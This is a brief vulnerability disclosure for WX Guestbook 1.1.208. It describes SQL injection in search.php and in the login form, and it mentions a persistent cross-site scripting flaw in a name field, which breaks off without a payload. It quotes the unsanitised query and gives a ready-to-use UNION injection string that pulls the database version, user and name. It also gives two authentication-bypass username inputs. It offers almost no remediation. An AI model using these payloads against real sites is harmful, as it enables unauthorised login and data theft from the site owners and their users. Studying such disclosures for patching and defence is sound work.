Product name: WX Guestbook 1.1.208
Product vendor: www.webilix.com

This product suffers from multiple SQLi and persistent XSS vuln.

##############  SQL Search Vuln  ###############

The search parameters/queries we submit to the search.php are unsanitized and hence this can be compromised to SQLinject the server.

SQL query:
$signs = DB_Execute("SELECT * FROM `wxgb_signs` WHERE (`sign` LIKE &#039;%" . $QUERY . "%&#039;) ORDER BY `code` DESC");

The $QUERY is what we submit through search box so injecting this will sql inject the server.
The following is the sample sql injection example.


Sample search string: test%&#039;) UNION ALL SELECT 1,2,concat(@@version,0x3a,user(),database()),4,5,6,7,8,9,10,11,12/*

##############  SQL login bypass  ###############
The username and password fields are unsanitized and hence we can bypass the login systems.

Username: admin&#039;))/*
Password: learn3r  [or whatever]

Or

Username: &#039;)) or 1=1/*
Password: learn3r  [or whatever]

##############  Persistent XSS Vulns  ##############

In the name field (I suppose as I don&#039;t understand arabic), you can inject XSS...
